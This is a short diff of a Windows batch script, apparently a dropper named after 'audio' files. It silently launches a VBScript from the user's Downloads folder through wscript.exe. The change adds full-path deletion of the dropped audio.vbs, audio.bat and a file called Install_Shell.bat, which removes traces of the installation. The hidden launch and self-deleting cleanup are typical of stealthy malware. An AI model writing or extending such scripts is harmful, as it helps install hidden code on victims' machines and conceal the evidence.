@@ -19,7 +19,8 @@ echo exit >> "%USERPROFILE%\Downloads\audio.bat"
 start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs"
 
 :: Deletar .vbs .bat
-del audio.vbs
-del audio.bat
+del "%USERPROFILE%\Downloads\audio.vbs"
+del "%USERPROFILE%\Downloads\audio.bat"
+del "%USERPROFILE%\Downloads\Install_Shell.bat"
 
 exit
